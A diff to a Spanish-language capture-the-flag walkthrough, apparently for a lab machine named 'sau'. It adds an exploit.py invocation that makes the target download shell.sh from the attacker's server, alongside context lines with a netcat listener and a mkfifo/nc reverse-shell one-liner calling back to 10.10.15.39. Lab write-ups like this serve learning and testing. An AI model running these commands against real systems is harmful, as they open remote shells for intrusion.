@@ -104,8 +104,14 @@ nc -lvnp 4444
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.39 4444 >/tmp/f
 ```
 
-Se lanza el exploit (en la carpeta del PoC) apuntando al objetivo y a nuestro `shell.sh`. El
-servidor Python registra que la víctima **descarga** el fichero y, en el *listener*, recibimos la
+Se lanza el exploit (en la carpeta del PoC) apuntando al objetivo y a nuestro `shell.sh`:
+
+```
+python3 exploit.py -t 10.129.229.26 -p 55555 -b sau \
+    --local-ip 10.10.15.39 --local-port 8000 --payload-file shell.sh
+```
+
+El servidor Python registra que la víctima **descarga** el fichero y, en el *listener*, recibimos la
 shell como **`puma`**:
 
 ![Reverse shell recibida como el usuario puma](capturas/sau-shell-puma.png)
